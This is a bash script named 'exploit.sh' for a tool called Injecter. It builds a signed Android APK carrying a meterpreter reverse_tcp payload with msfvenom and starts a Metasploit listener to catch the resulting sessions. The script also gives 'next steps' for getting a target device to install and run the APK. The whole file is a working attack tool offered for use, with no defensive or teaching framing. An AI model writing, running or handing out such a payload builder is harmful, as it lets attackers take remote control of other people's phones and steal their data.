#!/bin/bash
# exploit.sh
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

display_banner() {
    clear
    echo -e "${RED}"
    cat << "EOF"
    ╔═══════════════════════════════════════╗
    ║                                       ║
    ║          INJECTER EXPLOIT             ║
    ║     Quick Payload Launcher            ║
    ║                                       ║
    ╚═══════════════════════════════════════╝
EOF
    echo -e "${NC}"
    echo -e "${GREEN}GitHub: https://github.com/yourusername/Injecter${NC}"
    echo ""
}

show_message() {
    echo -e "${BLUE}[*]${NC} $1"
}

show_success() {
    echo -e "${GREEN}[+]${NC} $1"
}

show_error() {
    echo -e "${RED}[-]${NC} $1"
}

validate_ip() {
    local ip=$1
    if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        IFS='.' read -r i1 i2 i3 i4 <<< "$ip"
        if [[ $i1 -le 255 && $i2 -le 255 && $i3 -le 255 && $i4 -le 255 ]]; then
            return 0
        fi
    fi
    return 1
}

validate_port() {
    local port=$1
    if [[ $port =~ ^[0-9]+$ ]] && [ $port -ge 1 ] && [ $port -le 65535 ]; then
        return 0
    fi
    return 1
}

check_dependencies() {
    show_message "Checking dependencies..."
    
    if ! command -v msfvenom &> /dev/null; then
        show_error "msfvenom not found. Run setup.sh first."
        exit 1
    fi
    
    if ! command -v java &> /dev/null; then
        show_error "Java not found. Run setup.sh first."
        exit 1
    fi
    
    show_success "Dependencies OK"
}

create_payload() {
    local lhost=$1
    local lport=$2
    
    show_message "Creating payload..."
    
    # Create payload filename
    local output_file="exploit_${lhost//./_}_${lport}_$(date +%s).apk"
    
    # Generate payload
    msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o "$output_file"
    
    if [ ! -f "$output_file" ]; then
        show_error "Failed to create payload"
        return 1
    fi
    
    # Sign the APK
    show_message "Signing APK..."
    
    # Check for keystore
    if [ ! -f "injecter.keystore" ]; then
        show_message "Creating keystore..."
        keytool -genkey -v -keystore injecter.keystore \
            -alias injecter_key \
            -keyalg RSA -keysize 2048 \
            -validity 10000 \
            -storepass injecter123 \
            -keypass injecter123 \
            -dname "CN=Injecter" 2>/dev/null
    fi
    
    jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 \
        -keystore injecter.keystore \
        -storepass injecter123 \
        -keypass injecter123 \
        "$output_file" injecter_key 2>/dev/null
    
    show_success "Payload created: $output_file"
    echo "$output_file"
}

start_listener() {
    local lport=$1
    
    show_message "Starting Metasploit listener..."
    
    cat << EOF
----------------------------------------------
LISTENER COMMAND:
msfconsole -q -x "use exploit/multi/handler; \\
  set PAYLOAD android/meterpreter/reverse_tcp; \\
  set LHOST 0.0.0.0; \\
  set LPORT $lport; \\
  set ExitOnSession false; \\
  exploit"
----------------------------------------------
EOF
    
    read -p "$(echo -e ${YELLOW}"Start listener now? (y/n): "${NC})" start_now
    
    if [[ $start_now =~ ^[Yy]$ ]]; then
        msfconsole -q -x "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT $lport; set ExitOnSession false; exploit"
    else
        show_message "Listener command ready. Start it when needed."
    fi
}

main_menu() {
    while true; do
        clear
        display_banner
        
        echo -e "${CYAN}Main Menu:${NC}"
        echo ""
        echo -e "  ${GREEN}[1]${NC} Create Android payload"
        echo -e "  ${GREEN}[2]${NC} Show network info"
        echo -e "  ${GREEN}[3]${NC} Check dependencies"
        echo -e "  ${GREEN}[4]${NC} Open GitHub"
        echo -e "  ${GREEN}[5]${NC} Exit"
        echo ""
        
        read -p "$(echo -e ${CYAN}"Select option [1-5]: "${NC})" choice
        
        case $choice in
            1)
                create_payload_menu
                ;;
            2)
                show_network_info
                ;;
            3)
                check_dependencies
                read -p "Press Enter to continue..."
                ;;
            4)
                xdg-open "https://github.com/zerotrace-hub/Injecter" 2>/dev/null || \
                show_message "GitHub: https://github.com/zerotrace-hub/Injecter"
                read -p "Press Enter to continue..."
                ;;
            5)
                show_message "Exiting INJECTER Exploit..."
                exit 0
                ;;
            *)
                show_error "Invalid option"
                sleep 1
                ;;
        esac
    done
}

create_payload_menu() {
    clear
    display_banner
    
    echo -e "${CYAN}Create Android Payload${NC}"
    echo ""
    
    # Show available IPs
    show_message "Available IP addresses:"
    ip -o addr show | awk '!/^[0-9]*: lo:/ && /inet / {gsub(/\/.*/, "", $4); print "  " $4 " (" $2 ")"}'
    echo ""
    
    # Get LHOST
    while true; do
        read -p "$(echo -e ${CYAN}"Enter LHOST: "${NC})" LHOST
        
        if validate_ip "$LHOST"; then
            break
        else
            show_error "Invalid IP address"
        fi
    done
    
    # Get LPORT
    while true; do
        read -p "$(echo -e ${CYAN}"Enter LPORT [4444]: "${NC})" LPORT
        LPORT=${LPORT:-4444}
        
        if validate_port "$LPORT"; then
            break
        else
            show_error "Invalid port"
        fi
    done
    
    # Create payload
    check_dependencies
    OUTPUT_FILE=$(create_payload "$LHOST" "$LPORT")
    
    if [ ! -z "$OUTPUT_FILE" ]; then
        echo ""
        echo -e "${GREEN}════════════════════════════════════════════════${NC}"
        echo -e "${WHITE}          PAYLOAD CREATED SUCCESSFULLY          ${NC}"
        echo -e "${GREEN}════════════════════════════════════════════════${NC}"
        echo ""
        echo -e "${CYAN}Payload File:${NC} $OUTPUT_FILE"
        echo -e "${CYAN}LHOST:${NC} $LHOST"
        echo -e "${CYAN}LPORT:${NC} $LPORT"
        echo -e "${CYAN}Size:${NC} $(du -h "$OUTPUT_FILE" 2>/dev/null | cut -f1)"
        echo ""
        
        # Ask to start listener
        start_listener "$LPORT"
        
        # Show next steps
        echo ""
        echo -e "${YELLOW}Next Steps:${NC}"
        echo "  1. Transfer $OUTPUT_FILE to Android device"
        echo "  2. Install APK (enable 'Unknown Sources')"
        echo "  3. Run the application"
        echo ""
        
        read -p "$(echo -e ${YELLOW}"Press Enter to continue..."${NC})"
    fi
}

show_network_info() {
    clear
    display_banner
    
    echo -e "${CYAN}Network Information${NC}"
    echo ""
    
    echo -e "${WHITE}IP Addresses:${NC}"
    echo "----------------"
    ip -o addr show | awk '!/^[0-9]*: lo:/ && /inet / {gsub(/\/.*/, "", $4); print "  " $4 " (" $2 ")"}'
    
    echo ""
    echo -e "${WHITE}Open Ports:${NC}"
    echo "------------"
    netstat -tulpn 2>/dev/null | grep LISTEN | awk '{print "  " $4 " - " $7}'
    
    echo ""
    echo -e "${WHITE}Public IP:${NC}"
    echo "-----------"
    curl -s ifconfig.me 2>/dev/null || echo "  Could not fetch public IP"
    
    echo ""
    read -p "$(echo -e ${YELLOW}"Press Enter to continue..."${NC})"
}

# Main execution
display_banner
check_dependencies
main_menu